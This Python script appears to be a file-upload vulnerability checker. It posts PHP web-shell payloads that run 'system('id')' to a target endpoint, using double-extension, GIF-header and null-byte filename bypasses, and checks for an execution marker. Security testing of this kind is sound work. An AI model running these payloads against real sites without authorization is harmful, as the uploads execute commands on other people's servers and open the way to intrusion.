import requests
from urllib.parse import urljoin
import time

TEST_FILES = {
    "shell.php": ("shell.php", "<?php echo 'VULNERABLE_MARKER_99'; system('id'); ?>", "text/x-php", "VULNERABLE_MARKER_99"),

    "shell.php.jpg": (
        "shell.php.jpg",
        "GIF89a; <?php echo 'VULNERABLE_MARKER_99'; system('id'); ?>",
        "image/jpeg",
        "VULNERABLE_MARKER_99"
    ),

    "shell_null.jpg": (
        "shell.php\x00.jpg",
        "<?php echo 'VULNERABLE_MARKER_99'; system('id'); ?>",
        "image/jpeg",
        "VULNERABLE_MARKER_99"
    ),

    "test.html": (
        "test.html",
        "<h1>File Access Confirmed</h1>",
        "text/html",
        "File Access Confirmed"
    ),
}

COMMON_FIELD_NAMES = ["file", "upload", "image", "document", "photo"]

def _safe_text_snippet(text, length=300):
    if not text:
        return ""
    return text[:length].replace('\n', ' ').strip()

def _extract_uploaded_url(response_text, uploaded_filename, base_url):
    clean_filename = uploaded_filename.split("\x00")[0]  
    return urljoin(base_url, f"/uploads/{clean_filename}")

def check_file_upload(domain, upload_endpoint, field_names=COMMON_FIELD_NAMES, timeout=7, delay=0.3):
    
    session = requests.Session()
    session.headers.update({
        "User-Agent": "file-upload-checker/1.0",
        "Referer": domain
    })

    url = domain.rstrip("/") + upload_endpoint
    results = []
    vulnerability_found = False

    for field_name in field_names:
        for test_key, (filename, content, mime, marker) in TEST_FILES.items():
            files = {field_name: (filename, content, mime)}

            rec = {
                "field_name": field_name,
                "payload_file": filename.split("\x00")[0],
                "vulnerable": False,
                "reason": "Not Tested",
                "upload_status": "N/A",
                "upload_snippet": "",
                "access_snippet": ""
            }

            try:
                response = session.post(url, files=files, timeout=timeout)
                rec["upload_status"] = f"Success:{response.status_code}"
                rec["upload_snippet"] = _safe_text_snippet(response.text)

                if response.status_code in [200, 201]:
                    test_url = _extract_uploaded_url(response.text, filename, url)
                    access_response = session.get(test_url, timeout=timeout)
                    rec["access_snippet"] = _safe_text_snippet(access_response.text)

                    if access_response.status_code == 200:
                        if marker in access_response.text:
                            rec["vulnerable"] = True
                            vulnerability_found = True
                            rec["reason"] = f"VULNERABLE: Execution marker '{marker}' found."
                        else:
                            rec["reason"] = "File accessible (200), but execution marker not found."
                    else:
                        rec["reason"] = f"File not directly accessible (Status {access_response.status_code})."
                else:
                    rec["reason"] = f"Upload failed (Status {response.status_code})."

            except requests.exceptions.RequestException as e:
                rec["reason"] = f"Request Error: {str(e)}"

            results.append(rec)
            time.sleep(delay)  

    return {
        "vulnerability_found": vulnerability_found,
        "detailed_logs": results
    }
